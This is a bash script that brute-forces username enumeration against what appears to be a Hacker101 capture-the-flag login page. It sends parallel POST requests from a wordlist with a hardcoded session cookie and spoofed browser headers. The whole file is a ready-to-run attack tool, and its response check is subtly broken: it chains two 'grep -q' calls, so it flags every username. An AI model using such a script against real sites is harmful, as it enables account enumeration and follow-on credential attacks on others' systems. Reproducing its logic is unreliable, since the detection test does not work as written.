#!/bin/bash

# Check if parallel is installed
if ! command -v parallel &> /dev/null; then
    echo "GNU Parallel is not installed. Please install it first."
    echo "On Ubuntu/Debian: sudo apt-get install parallel"
    echo "On CentOS/RHEL: sudo yum install parallel"
    echo "On macOS: brew install parallel"
    exit 1
fi

# Check if input file is provided
if [ $# -ne 1 ]; then
    echo "Usage: $0 <username_file>"
    exit 1
fi

input_file="$1"

# Check if file exists
if [ ! -f "$input_file" ]; then
    echo "Error: File '$input_file' not found"
    exit 1
fi

# Base URL and constants
BASE_URL="https://5968a3c8b69aa29fefcc42d4e2870ba1.ctf.hacker101.com/login"
SESSION_COOKIE="session=eyJjYXJ0IjpbXX0.ZytGRw.S3McjK-J6VPbp8ba8f1E023tDEc"

# Function to test a username
test_username() {
    local username="$1"
    response=$(curl --path-as-is -i -s -k -X POST \
        -H "Host: 5968a3c8b69aa29fefcc42d4e2870ba1.ctf.hacker101.com" \
        -H "Content-Length: 22" \
        -H "Cache-Control: max-age=0" \
        -H "Sec-Ch-Ua: \"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"130\"" \
        -H "Sec-Ch-Ua-Mobile: ?0" \
        -H "Sec-Ch-Ua-Platform: \"macOS\"" \
        -H "Accept-Language: en-GB,en;q=0.9" \
        -H "Origin: https://5968a3c8b69aa29fefcc42d4e2870ba1.ctf.hacker101.com" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Upgrade-Insecure-Requests: 1" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36" \
        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
        -H "Sec-Fetch-Site: same-origin" \
        -H "Sec-Fetch-Mode: navigate" \
        -H "Sec-Fetch-User: ?1" \
        -H "Sec-Fetch-Dest: document" \
        -H "Referer: https://5968a3c8b69aa29fefcc42d4e2870ba1.ctf.hacker101.com/login" \
        -H "Accept-Encoding: gzip, deflate, br" \
        -H "Priority: u=0, i" \
        -b "$SESSION_COOKIE" \
        --data-binary "username=${username}&password=dfd" \
        "${BASE_URL}")
    
    # Check if response doesn't contain either error indicator
    if   ! echo "$response" | grep -q "Invalid username" | grep -q "<!-- a padding to disable MSIE and Chrome friendly error page -->" ; then
        
        # Use flock to prevent output mixing
        {
            flock -x 200
            echo "Interesting response for username: $username"
            echo "Response:"
            echo "$response"
            echo "----------------------------------------"
        } 200>>/dev/null;
 
    fi
}

export -f test_username
export BASE_URL
export SESSION_COOKIE

# Create a temporary file with non-empty usernames
grep -v '^$' "$input_file" > "${input_file}.tmp"

echo "Starting username testing with 64 parallel threads..."

# Run the tests in parallel with 64 threads
cat "${input_file}.tmp" | parallel -j 64 --bar test_username

# Clean up
rm "${input_file}.tmp"

echo "Testing complete!"